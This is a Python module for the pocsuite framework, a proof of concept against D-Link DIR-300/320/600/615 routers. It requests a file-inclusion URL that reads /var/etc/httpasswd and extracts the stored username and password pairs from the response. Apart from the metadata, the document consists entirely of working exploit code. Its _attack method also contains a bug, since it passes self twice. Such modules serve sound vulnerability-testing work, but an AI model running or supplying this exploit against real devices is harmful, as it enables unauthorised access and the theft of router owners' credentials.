#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re


class TestPOC(POCBase):
    name = "D-Link DIR-300 & DIR-320 & DIR-600 & DIR-615 Info Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Auth Bypass'
    version = '1.0'  # default version: 1.0
    references = 'http://seclists.org/bugtraq/2013/Dec/11'
    desc = 'module explois information disclosure vulnerability in D-Link DIR-300, DIR-320, DIR-600,DIR-615 devices. It is possible to retrieve sensitive information such as credentials.'


    vulDate = ''
    createDate = '2017-10-16'
    updateDate = '2017-10-16'

    appName = 'D-Link'
    appVersion = 'DIR-300, DIR-320, DIR-600,DIR-615'
    dork = ''
    appPowerLink = 'http://www.dlink.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url + '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
        resp = req.get(url)
        creds = re.findall("\n\t\t\t(.+?):(.+?)\n\n\t\t\t", resp.content)
        if resp.status_code == 200 and creds:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
